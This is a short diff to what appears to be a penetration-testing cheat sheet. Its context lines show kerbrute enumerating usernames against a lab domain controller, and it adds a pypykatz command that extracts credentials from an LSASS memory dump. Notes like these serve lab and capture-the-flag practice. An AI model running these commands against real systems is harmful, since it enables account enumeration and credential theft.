@@ -14,3 +14,6 @@
 ===================================================================================================================
 # kerbrute: To enumerate usernames, Kerbrute sends TGT requests with no pre-authentication. If the KDC responds with a PRINCIPAL UNKNOWN error, the username does not exist. However, if the KDC prompts for pre-authentication, we know the username exists and we move on. This does not cause any login failures so it will not lock out any accounts
     - kerbrute userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.175
+===================================================================================================================
+# pypykatz: extract data from lsass.DMP
+    - pypykatz lsa minidump lsass.DMP
